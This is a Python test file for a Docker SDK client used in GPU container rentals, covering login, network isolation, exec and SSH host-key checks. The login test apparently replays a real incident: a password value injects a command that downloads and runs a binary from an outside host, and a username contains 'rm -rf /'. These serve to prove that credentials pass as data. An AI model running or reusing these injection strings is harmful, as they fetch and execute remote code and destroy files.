from unittest.mock import Mock

import pytest
from docker.errors import NotFound

from datura.requests.miner_requests import ExecutorSSHInfo
from services.rental_docker_sdk import (
    RENTAL_NETWORK_ICC_OPTION,
    RENTAL_NETWORK_NAME,
    ContainerExecSpec,
    ContainerRunSpec,
    RentalDockerConnectionError,
    RentalDockerOperationError,
    RentalDockerSdkClient,
    RentalDockerSdkClientFactory,
)


INCIDENT_DOCKER_PASSWORD = (
    "x' | curl -fsSL https://x0.at/mney -o /tmp/mney"
    "&&chmod +x /tmp/mney && /tmp/mney   |echo '"
)


def _bridge_network(options: dict | None) -> dict:
    """The part of `docker network inspect` the SDK reads: driver and the options it was created with."""
    return {"Name": RENTAL_NETWORK_NAME, "Driver": "bridge", "Options": dict(options or {})}


class FakeApiClient:
    def __init__(self):
        self.login_calls = []
        self.inspected_images = []
        self.missing_images = set()
        self.inspect_image_error = None
        self.repo_digests = []
        self.remote_digest = "sha256:remote"
        self.inspect_distribution_error = None
        self.distribution_calls = []
        self.host_config_kwargs = None
        self.created_container = None
        self.started = []
        self.stopped = []
        self.exec_created = []
        self.exec_started = []
        self.exec_inspected = []
        self.containers_inspected = []
        self.container_states = None
        self.inspect_container_error = None
        self.events = []
        self.pruned_images = False
        self.created_volumes = []
        self.removed_volumes = []
        self.networks = {}  # name -> what inspect_network returns
        self.created_networks = []
        self.inspect_network_error = None  # raised by inspect_network instead of answering
        self.create_network_error = None  # raised by create_network
        self.lose_create_race = False  # with create_network_error: the network exists anyway (another create won)
        self.timeout = 60
        self.closed = False

    def create_host_config(self, **kwargs):
        self.host_config_kwargs = kwargs
        return {"host_config": True}

    def inspect_network(self, net_id, **_kwargs):
        self.events.append("inspect_network")
        if self.inspect_network_error is not None:
            raise self.inspect_network_error
        if net_id not in self.networks:
            raise NotFound(f"network {net_id} not found")
        return self.networks[net_id]

    def create_network(self, name, **kwargs):
        self.events.append("create_network")
        self.created_networks.append({"name": name, **kwargs})
        if self.create_network_error is not None:
            if self.lose_create_race:
                self.networks[name] = _bridge_network(kwargs.get("options"))
            raise self.create_network_error
        self.networks[name] = _bridge_network(kwargs.get("options"))
        return {"Id": "network-id"}

    def login(self, **kwargs):
        self.login_calls.append(kwargs)

    def inspect_image(self, image):
        self.inspected_images.append(image)
        if self.inspect_image_error is not None:
            raise self.inspect_image_error
        if image in self.missing_images:
            raise ImageNotFound("missing image")
        return {"Id": "image-id", "RepoDigests": self.repo_digests}

    def inspect_distribution(self, image, auth_config=None):
        self.distribution_calls.append({"image": image, "auth_config": auth_config})
        if self.inspect_distribution_error is not None:
            raise self.inspect_distribution_error
        return {"Descriptor": {"digest": self.remote_digest}}

    def create_container(self, **kwargs):
        self.events.append("create_container")
        self.created_container = kwargs
        return {"Id": "container-id"}

    def start(self, container_name):
        self.events.append("start")
        self.started.append(container_name)

    def stop(self, container_name, timeout=None):
        self.stopped.append({"container_name": container_name, "timeout": timeout})

    def exec_create(self, **kwargs):
        self.events.append("exec_create")
        self.exec_created.append(kwargs)
        return {"Id": "exec-id"}

    def exec_start(self, exec_id, **kwargs):
        self.exec_started.append((exec_id, kwargs))
        return (b"stdout", b"stderr")

    def exec_inspect(self, exec_id):
        self.exec_inspected.append(exec_id)
        return {"ExitCode": 0}

    def inspect_container(self, container_name):
        self.events.append("inspect_container")
        self.containers_inspected.append(container_name)
        if self.inspect_container_error is not None:
            raise self.inspect_container_error
        if self.container_states is not None:
            if len(self.container_states) > 1:
                return self.container_states.pop(0)
            return self.container_states[0]
        return {"State": {"Running": True, "Restarting": False}}

    def prune_images(self):
        self.pruned_images = True
        return {"ImagesDeleted": []}

    def create_volume(self, **kwargs):
        self.created_volumes.append({**kwargs, "client_timeout": self.timeout})
        return {"Name": kwargs.get("name")}

    def remove_volume(self, volume_name, **kwargs):
        self.removed_volumes.append((volume_name, kwargs))

    def close(self):
        self.closed = True


class ImageNotFound(Exception):
    pass


@pytest.mark.asyncio
async def test_login_passes_credentials_as_sdk_data():
    api_client = FakeApiClient()
    client = RentalDockerSdkClient(api_client)
    username = "user'; rm -rf / #"

    await client.login(
        username=username, password=INCIDENT_DOCKER_PASSWORD, image="ubuntu:latest"
    )

    assert api_client.login_calls == [
        {
            "username": username,
            "password": INCIDENT_DOCKER_PASSWORD,
            "registry": None,
            "reauth": True,
        }
    ]


# --- DAH-3199: a rental joins the ICC-off bridge, never docker0 ---


def _rental_spec(network: str | None = RENTAL_NETWORK_NAME) -> ContainerRunSpec:
    return ContainerRunSpec(image="registry.example/app:tag", name="pod_test", network=network)


@pytest.mark.parametrize(
    "existing",
    [
        pytest.param({"Name": RENTAL_NETWORK_NAME, "Driver": "bridge", "Options": {}}, id="icc-left-on"),
        pytest.param(
            {"Name": RENTAL_NETWORK_NAME, "Driver": "bridge", "Options": {RENTAL_NETWORK_ICC_OPTION: "true"}},
            id="icc-explicitly-on",
        ),
        pytest.param(
            {"Name": RENTAL_NETWORK_NAME, "Driver": "macvlan", "Options": {RENTAL_NETWORK_ICC_OPTION: "false"}},
            id="not-a-bridge",
        ),
    ],
)
@pytest.mark.asyncio
async def test_run_container_refuses_a_same_named_network_that_does_not_isolate(existing):
    api_client = FakeApiClient()
    api_client.networks[RENTAL_NETWORK_NAME] = existing
    client = RentalDockerSdkClient(api_client)

    with pytest.raises(RentalDockerOperationError, match=f"{RENTAL_NETWORK_ICC_OPTION}=false"):
        await client.run_container(_rental_spec())

    # fail closed: no container is created on a network that would let co-tenants talk
    assert api_client.created_container is None
    assert api_client.started == []


@pytest.mark.asyncio
async def test_exec_in_container_passes_argv_and_environment_as_data():
    api_client = FakeApiClient()
    client = RentalDockerSdkClient(api_client)

    result = await client.exec_in_container(
        ContainerExecSpec(
            container_name="pod_exec",
            argv=("sh", "-c", "cat /tmp/file"),
            environment={"A": "B"},
        )
    )

    assert result.exit_status == 0
    assert result.stdout == "stdout"
    assert result.stderr == "stderr"
    assert api_client.exec_created == [
        {
            "container": "pod_exec",
            "cmd": ["sh", "-c", "cat /tmp/file"],
            "stdin": False,
            "environment": {"A": "B"},
            # DAH-2534: pinned so a non-root image USER cannot break /root writes.
            "user": "0",
        }
    ]
    assert api_client.exec_started == [("exec-id", {"demux": True})]
    assert api_client.containers_inspected == ["pod_exec"]


@pytest.mark.asyncio
async def test_factory_fails_closed_without_executor_host_key():
    api_client_factory = Mock()
    factory = RentalDockerSdkClientFactory(api_client_factory=api_client_factory)
    executor_info = ExecutorSSHInfo(
        uuid="executor-id",
        address="127.0.0.1",
        port=8000,
        ssh_username="root",
        ssh_port=2222,
        python_path="/usr/bin/python",
        root_dir="/root",
        ssh_host_key=None,
    )

    with pytest.raises(RentalDockerConnectionError):
        async with factory.connect(
            executor_info=executor_info,
            private_key="PRIVATE KEY",
        ):
            pass

    api_client_factory.assert_not_called()


# DAH-3678: one read of the container's state after a failed exec, for the create path to tell an
# image whose CMD exits at once (DAH-2624) from an exec that failed inside a running container.


